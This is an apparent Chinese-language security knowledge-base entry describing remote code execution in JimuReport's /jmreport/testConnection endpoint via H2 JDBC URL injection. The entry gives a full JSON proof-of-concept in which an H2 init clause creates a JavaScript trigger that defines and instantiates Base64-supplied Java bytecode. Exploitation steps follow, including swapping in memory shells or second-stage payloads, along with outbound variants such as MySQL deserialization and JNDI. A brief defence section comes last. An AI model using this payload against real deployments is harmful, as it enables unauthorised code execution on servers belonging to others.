---
id: web-java-component-jimureport-testconnection-jdbc-h2-javascript-trigger-rce
title: JimuReport /jmreport/testConnection JDBC URL 注入：H2 init 创建 JavaScript 触发器加载字节码不出网 RCE
type: scenario
domain: web
path: web/java/component
technique: jimureport-testconnection-h2-javascript-trigger
tags:
- java
- jimureport
- jeecgboot
- jdbc
- h2
- javascript
- trigger
- rce
- low-code
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V203
  verified_at: '2026-11-07T02:17:36+08:00'
  notes: 已对照原文核对：/jmreport/testConnection 接收 dbType/dbDriver/dbUrl/dbUsername/dbPassword、H2 init=CREATE TRIGGER ... AS $$//javascript$$、ContextClassLoader+defineClass 加载 Base64 字节码、不出网，与原文 POC 一致。未验证点：未对真实实例复现；H2/JDK 版本依赖未验证；原文无受影响版本；frontmatter 无 sources/source_url。
url: /docs/web/java/component/web-java-component-jimureport-testconnection-jdbc-h2-javascript-trigger-rce/
draft: false
kb_aliases:
- 积木报表数据源测试 RCE
- jmreport testConnection
- H2 CREATE TRIGGER javascript
- JDBC URL 注入字节码
- JimuReport H2 不出网 RCE
---

## 一句话结论

JimuReport 的 `POST /jmreport/testConnection` 接受 `dbType`、`dbDriver`、`dbUrl`、`dbUsername`、`dbPassword` 等参数并直接建立 JDBC 连接；当 classpath 存在 H2 时，构造 `jdbc:h2:mem:testa;MODE=MSSQLServer;init=CREATE TRIGGER ... AS $$//javascript ...$$`，H2 在建立连接时执行 `INIT` SQL、编译并触发 JavaScript 触发器，通过当前线程 `ContextClassLoader` 加载内嵌 Base64 Java 字节码，实现不出网代码执行。

## 原理

- `/jmreport/testConnection` 是报表数据源连通性测试接口，服务端根据请求中的驱动类名和 JDBC URL 调用 `DriverManager`/驱动 `connect()`；如果未对 `dbDriver` 和 `dbUrl` 做白名单或语义校验，攻击者可控制完整 JDBC URL。
- H2 的 JDBC URL 支持 `INIT=` 参数，驱动在建立连接时会执行其中的 SQL。攻击者放入 `CREATE TRIGGER s BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript ...$$`，H2 会注册该触发器并在查询 `INFORMATION_SCHEMA.TABLES` 时执行。
- `//javascript` 前缀让 H2 用内置 JavaScript 引擎（如 JDK 8–14 的 Nashorn）编译触发器体；JS 代码可以访问 Java 类，拿到 `java.lang.Thread.currentThread().getContextClassLoader()`，再用反射调用 `ClassLoader.defineClass` 把 Base64 字符串解码成字节码并实例化，从而执行任意 Java 代码。
- 该链不需要目标出网，但依赖 H2 驱动在 classpath 中、JDK 带有可用 JS 引擎；不同 H2/JDK 版本对 JavaScript 触发器和 `init` 的支持不同。
- 若目标可出网，也可换成 MySQL JDBC 的 `autoDeserialize`/`allowLoadLocalInfile`、JNDI lookup 等远程加载方式，减少本地 payload 特征。

## 触发条件

- 目标集成 JimuReport 并暴露 `/jmreport/testConnection`，接口可达（鉴权视版本而定）。
- classpath 中存在 H2 驱动，且 JDK/H2 支持 JavaScript 触发器。
- 服务端未对 JDBC 驱动类名/URL 做白名单、协议限制或 `init` 参数过滤。

## 利用步骤

1. 向 `/jmreport/testConnection` 发送 JSON，先使用合法 H2 URL 确认接口返回与驱动行为。
2. 替换 `dbUrl` 为带 `init=CREATE TRIGGER ... AS $$//javascript ...$$` 的 H2 URL，触发器体执行 `Runtime.getRuntime().exec()` 或加载 Base64 字节码验证。
3. 观察 DNS/HTTP 外带、命令回显或进程行为；成功后可将字节码替换为内存马/二阶段载荷。
4. 若 H2 不可用，根据目标依赖尝试 MySQL JDBC 反序列化、JNDI 等出网链。

## PoC

```json
{
  "dbType": "H2",
  "dbDriver": "org.h2.Driver",
  "dbUrl": "jdbc:h2:mem:testa;MODE=MSSQLServer;init=CREATE TRIGGER s BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nvar classLoader = java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('ClassName').newInstance();}catch (e){var clsString = classLoader.loadClass('java.lang.String');var bs64 = '<base64-bytecode>';var bytecode;var clsBase64 = classLoader.loadClass('java.util.Base64');var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder');var decoder = clsBase64.getMethod('getDecoder').invoke(clsBase64);bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bs64);var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');var clsByteArray = (new java.lang.String('a').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length));clazz.newInstance();}$$",
  "dbUsername": "1",
  "dbPassword": "1"
}
```

## 变体与关联

- 同技术的其他入口：低代码平台数据源校验 `validateC3p0DBConfig`、其他 `testConnection` 类接口；核心 sink 都是用户可控 JDBC URL 进入 `driver.connect()`。
- H2 其他利用：`RUNSCRIPT`、`CREATE ALIAS`、`PostgreSQL loggerFile` 写 JAR、`socketFactory` 加载 Spring XML。
- 出网变体：MySQL JDBC `autoDeserialize`/`allowLoadLocalInfile`、JNDI 远程类加载。
- 关联：JimuReport `/jmreport/save` 表达式注入、`/jmreport/queryFieldBySql` FreeMarker 注入。

## 检测与防御

- 对数据源测试接口的 `dbDriver`、`dbUrl` 做严格白名单/协议限制，禁止 `init`、`CREATE TRIGGER`、`RUNSCRIPT` 等 H2 参数。
- 生产环境移除 H2 驱动，或升级到禁用危险 `init` 语义的版本；限制报表服务的出网能力。
- 对 `/jmreport/testConnection` 强制鉴权并审计异常 JDBC URL。
- 监控 H2 连接初始化阶段的异常 SQL 与 JavaScript 触发器创建行为。
